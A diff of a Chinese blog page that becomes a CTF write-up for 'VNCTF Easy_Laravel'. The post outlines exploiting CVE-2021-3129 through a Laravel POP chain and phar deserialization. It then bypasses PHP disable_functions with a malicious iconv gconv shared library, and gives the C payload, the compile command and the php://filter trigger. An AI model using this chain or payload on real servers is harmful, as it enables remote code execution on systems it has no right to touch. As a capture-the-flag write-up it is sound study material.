@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-       <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta content="yes" name="apple-mobile-web-app-capable" />
   <meta content="black" name="apple-mobile-web-app-status-bar-style" />
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>CTF | 过客</title>
+  <title>VNCTF Easy_Laravel  | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="CTF | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="VNCTF Easy_Laravel  | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,6 +25,11 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="VNCTF Easy_Laravel "/>
+    <meta property="og:url" content="https://guokeya.github.io/post/e_LgG7X5A/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
   	<!-- Navigation -->
@@ -66,177 +71,111 @@
       </div>
     </div>
   </nav>
-<!-- Page Header -->
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <div class="post-heading">
-            <h1 class="tag-tl">#CTF</h1>
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>VNCTF Easy_Laravel </h1>
+            <span class="meta">
+            	Posted on
+              2021-03-15，2 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
+
+  <!-- Post Content -->
+  <article>
     <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/hpyo8CYfD/">
-            <h2 class="post-title">
-              PHP class_exists函数漏洞
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>漏洞介绍</strong><br>
-class_exists()函数，会判断用户传过来的控制器是否存在，默认情况下，如果程序中存在__autoload函数，那么在使用class_exists()函数时，就会自动调用__autoload函数，</p>
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h3 id="题目标题">[题目标题]：</h3>
+<pre><code class="language-plain">Easy_laravel
+</code></pre>
+<h3 id="题目描述">[题目描述]：</h3>
+<pre><code class="language-plain">简单的漏洞复现
+</code></pre>
+<h3 id="题目考点">[题目考点]：</h3>
+<pre><code class="language-plain">1. CVE-2021-3129复现
+2. 挖掘laravel 8.22.0 POP链
+3. bypass disable_function
+</code></pre>
+<h3 id="题目环境">[题目环境]：</h3>
+<pre><code class="language-plain">1. ubuntu1~18.04.1
+2. Apache/2.4.38
+3. php:7.4.3-apache
+</code></pre>
+<h3 id="题目writeup">[题目writeup]：</h3>
+<ol>
+<li>进入主页很明显是Laravel Debug Rce 。由于源码中对一些已公开的pop链做了修改。并且php版本为7.4没有assert、web目录只有session和log目录有写权限。需要自己挖一个eval的POP链。</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://uploader.shimo.im/f/hpNT9TvxNWWOvP9M.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<p>ImportConfigurator类的destruct方法可以跳转到__call</p>
+<figure data-type="image" tabindex="2"><img src="https://uploader.shimo.im/f/S0CHJXC6hwLXAJlv.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<p>HigherOrderMessage类的__call方法存在任意类的方法调用</p>
+<figure data-type="image" tabindex="3"><img src="https://uploader.shimo.im/f/UZ3ovUffzWtCtXGP.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<p>MockTrait类的generate方法存在eval调用。并且值可控</p>
+<figure data-type="image" tabindex="4"><img src="https://uploader.shimo.im/f/6e81n4VDT91NIR7g.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<p>然后就可以eval执行代码</p>
+<ol>
+<li>写一个phar在logs下，一直调用phar反序列化。eval执行代码</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://uploader.shimo.im/f/tM0iuOtoREInmRol.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<ol>
+<li>调用phpinfo()发现有disable_funciton和open_basedir，发现禁用其他函数。但是可以用global协议查看根目录</li>
+</ol>
+<figure data-type="image" tabindex="6"><img src="https://uploader.shimo.im/f/YwIZQSh5Mab4IdNl.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://uploader.shimo.im/f/9TxaLTBZB77I139a.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<ol>
+<li>发现有/readflag。可以用伪协议触发iconv bypass disable_function</li>
+</ol>
+<p>生成so</p>
+<pre><code class="language-plain">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+void gconv() {}
+void gconv_init() {
+  system(&quot;/readflag &gt; /tmp/flag&quot;);
+  exit(0);
+}
+gcc payload.c -o payload.so -shared -fPI
+</code></pre>
+<ol>
+<li>由于没办法同时传json和上传文件。所以得GET分N次写入so</li>
+</ol>
+<figure data-type="image" tabindex="8"><img src="https://uploader.shimo.im/f/9dhMibUsDp9EaGjU.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
+<p>触发so。获取返回结果</p>
+<pre><code class="language-plain">file_put_contents('php://filter/write=convert.iconv.payload.utf-8/resource=/tmp/guoke',123);
+file_get_contents('/tmp/file');
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://uploader.shimo.im/f/2UjXorAwah7FZtHc.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/aMcQL_YEj/">
-            <h2 class="post-title">
-              Mysql 过滤逗号注入
-            </h2>
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/ZN3xqG-rM/">
+              <span class="post-title">
+                AntCTF x D^3CTF calc pool&rarr;
+              </span>
             </a>
-            <h3 class="post-subtitle">
-              <p><strong>实验环境</strong><br>
-i春秋，web SQLI</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
+          </p>
         
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/Vy_VN303p/">
-            <h2 class="post-title">
-              泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库)
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>漏洞描述</strong><br>
-泛微e-cology OA系统的WorkflowCenterTreeData接口在使用oracle数据库时,由于内置sql语句拼接不严,导致其存在sql注入漏洞</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">6 min read</span>
-            </p>
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/kp45piq14/">
-            <h2 class="post-title">
-              CTF PHP代码审计中intval，数字判断，整数溢出
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>代码分析</strong></p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/oUQYTq6U9/">
-            <h2 class="post-title">
-              CTF PHP代码审计中file_put_contents函数利用
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p>源码分析</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/Olw-A4WVi/">
-            <h2 class="post-title">
-              Mysql limit注入
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>实验环境</strong><br>
-http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/tag/CTF/page/11/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
+  </article>
  <!-- Footer -->
   <footer>
     <div class="container">
@@ -317,3 +256,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
